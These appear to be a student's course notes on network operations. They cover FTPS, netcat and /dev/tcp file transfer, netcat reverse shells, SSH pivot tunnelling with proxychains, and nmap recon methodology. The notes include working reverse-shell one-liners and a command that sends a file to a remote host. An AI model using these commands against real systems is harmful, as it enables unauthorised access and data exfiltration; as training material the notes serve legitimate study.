published in RFC 2228

should NOT be confused with traditional FTP tunneled over SSH or SFTP, a completely separate protocol.

can be operated in 2 modes: implicit and explicit

    implicit mode assumes encryption at all times and uses TCP port 990 for control and TCP port 989 for data with encryption happening on both channels.

    explicit mode uses port 21 and allow for the request of a secure or unsecure connection. The server can be configured to drop or limit unsecure connections.

uses SSL/TLS for encryption

Authentication through username/password or PKI

has interactive terminal access

still requires multiple open ports for multiple connections


WGET AND CURL-----------------------------------------------------

    If HTTP ports are open we can use wget, curl, or a web-browser like firefox to interact with it. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

        wget -r http://[ip] or wget -r http://[ip]:[port]

        curl http://[ip] or curl http://[ip]:[port]

        firefox [ip] or `firefox [ip]:[port]

    If FTP port is open we can use wget, curl or ftp to interact with it.

        wget -r ftp://[ip]

        curl ftp://[ip] or curl ftp://[ip]/file

        ftp [ip]

    If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

        nc [ip] [port]

        telnet [ip] or telnet [ip] [port]

        ssh [username]@[ip] or ssh [username]@[ip] -p [port]

--------------------------------------------------------------------------------------------------------------

send file nc 10.2.0.2 9001 < file.txt
recoeve file nc -l -p > newfile.txt



File Transfer with /dev/tcp

On the receiving box:

nc -l -p 1111 > file.txt

On the sending box:

cat file.txt > /dev/tcp/10.2.0.2/1111

This method is useful for host that does not have NETCAT available.


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Netcat operates in two primary modes:

    Client - netcat initiates connections to another computer

$ nc 10.2.0.2 1111

    Listener - netcat listens for a connections inbound from another computer (a listener must always be established first)

$ nc -l -p 2222
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


Reverse shell using NETCAT

When shelled into the remote host using -c :

nc -c /bin/sh <your ip> <any unfiltered port>

You could even pipe BASH through NETCAT.

/bin/sh | nc <your ip> <any unfiltered port>

Then listen for the shell.

nc -l -p <same unfiltered port> -vvv

You can also listen using the -e with NETCAT.

nc -l -p <any unfiltered port> -e /bin/bash
=============================================================================================================
=================================================================================================================
A/B/C/D

WINDOW 1 `- GOES TO BOX C
A$  ssh user@IP_B -L 1111:user@IP_C:22
        connection piece    tunnel piece
    
    ssh user@IP_B -L 1111:IP_C:22 -NT
    connect to b        tunnel piece
c
WINDOW 2
A$ wget -r localhost:1111

GOING TO D  
    D is port 23

@A ssh -p 1111 user@localhost -L 2222:IP_D:23
telnet localhost -p


NET RECON METHOLODY
1. host discovery(nmap, nc, scan.sh, ping sweep)
2. port discovery(nmap, nc, scan.sh)
3. port validiation (Banner Grabbing w/ nc )
4. follow actions based on ports found:
    if 22 or 23 connect and passive recon
    if 21 or 80 wget -r IP_ADDR or wget -r ftp://IP_ADDR
    
SCAN METHODOLOGY
1.quick scan 21-23,80
    nmap -Pn -p 21-23,80 192.168.0.5,20,25 -T4
2.specific ports based on hints found
3.well known ports 0-1023
`                   65535

PASSIVE RECON METHODOLOGY
hostname
ip a, ifconfig
ip neigh, arp -a
netstat -ntlp or ss -ntlp
which tcpdump wireshark nmap telnet wget curl

-----------------------------------------------
 A/B/C
dynamic tunneling

ssh user@IP_B -D 9050 -NT
proxychains wget -r ip_C

proxychains nmap 



a   ssh -p 2222 user@IP_B
b   ssh user@IP_C

a ssh -p 2222 user@IP_B -L 4444:IP_C:22 -NT
-----------------------------------------------
challenges
OPS$ ssh cctc@localhost -p 1111  ||| lcoal listening port on OPS

Which ssh syntax would properly setup a Local tunnel to PC1 SSH port? (Max 2 Attempts)
ssh -L 1111:localhost:22 cctc@10.50.1.150 -NT 
